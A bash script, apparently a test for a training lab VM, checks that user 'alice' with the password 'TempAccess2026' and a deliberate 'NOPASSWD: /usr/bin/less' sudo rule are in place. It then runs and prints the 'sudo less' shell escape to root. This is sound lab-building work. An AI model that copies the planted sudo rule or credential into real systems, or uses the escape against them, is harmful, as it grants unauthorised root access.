#!/bin/bash
# Test Alice's Privilege Escalation Path
# Simulates student exploitation

echo "=========================================="
echo "  Testing Alice Privilege Escalation"
echo "=========================================="
echo ""

echo "=== Test 1: Alice Account Exists ==="
echo ""

if id alice &>/dev/null; then
    echo "✓ User alice exists"
    id alice
else
    echo "✗ User alice does not exist"
    exit 1
fi

echo ""
echo "=== Test 2: Password Works ==="
echo ""

# Test password
if echo "TempAccess2026" | su alice -c "whoami" 2>/dev/null | grep -q "alice"; then
    echo "✓ Password 'TempAccess2026' works"
else
    echo "✗ Password does not work"
    echo "  Try: echo 'alice:TempAccess2026' | chpasswd"
    exit 1
fi

echo ""
echo "=== Test 3: Sudo Configuration ==="
echo ""

SUDO_CHECK=$(sudo -l -U alice 2>/dev/null)

if echo "$SUDO_CHECK" | grep -q "NOPASSWD.*less"; then
    echo "✓ Sudo configuration correct"
    echo "$SUDO_CHECK" | grep "NOPASSWD"
else
    echo "✗ Sudo configuration missing or incorrect"
    echo "  Expected: (ALL) NOPASSWD: /usr/bin/less"
    exit 1
fi

echo ""
echo "=== Test 4: Simulate Student Exploitation ==="
echo ""

echo "Step 1: SSH as alice (simulated)"
echo "  Command: ssh alice@192.168.56.21"
echo "  Password: TempAccess2026"
echo ""

echo "Step 2: Check sudo privileges"
echo "  Running: sudo -l"
echo ""
su alice -c "sudo -l" 2>/dev/null | grep -v "^$"

echo ""
echo "Step 3: Exploit sudo less to get root shell"
echo "  Command: sudo less /etc/passwd"
echo "  Inside less: !/bin/sh"
echo "  Result: Root shell"
echo ""

# Test that less can execute commands
echo "Testing command execution via less..."
RESULT=$(echo -e "!/bin/id\nq" | su alice -c "sudo less /etc/passwd 2>&1" | grep "uid=0")

if echo "$RESULT" | grep -q "uid=0"; then
    echo "✓ Privilege escalation works - can execute as root!"
    echo "  Output: $RESULT"
else
    echo "⚠ Automated test inconclusive (interactive shell required)"
    echo "  Manual test needed"
fi

echo ""
echo "=== Test 5: Check Breadcrumbs ==="
echo ""

if [ -f /home/alice/AUDIT_NOTES.txt ]; then
    echo "✓ Audit notes file exists"
    echo "  Location: /home/alice/AUDIT_NOTES.txt"
else
    echo "⚠ Audit notes file missing"
fi

if [ -f /home/alice/.bash_history ]; then
    echo "✓ Bash history exists"
    grep "sudo" /home/alice/.bash_history >/dev/null && echo "  Contains sudo commands"
else
    echo "⚠ Bash history missing"
fi

echo ""
echo "=========================================="
echo "  Test Summary"
echo "=========================================="
echo ""

echo "Alice Privilege Escalation Path:"
echo ""
echo "1. Initial Access (from SMB recon):"
echo "   alice:TempAccess2026"
echo ""
echo "2. SSH Login:"
echo "   ssh alice@192.168.56.21"
echo "   Password: TempAccess2026"
echo ""
echo "3. Enumeration:"
echo "   alice@vm:~$ sudo -l"
echo "   (ALL) NOPASSWD: /usr/bin/less"
echo ""
echo "4. Exploitation:"
echo "   alice@vm:~$ sudo less /etc/passwd"
echo "   (inside less, press:)"
echo "   !/bin/sh"
echo ""
echo "5. Result:"
echo "   # whoami"
echo "   root"
echo ""
echo "MITRE ATT&CK Mapping:"
echo "  - T1078: Valid Accounts"
echo "  - T1548.003: Sudo and Sudo Caching"
echo "  - T1068: Exploitation for Privilege Escalation"
echo ""
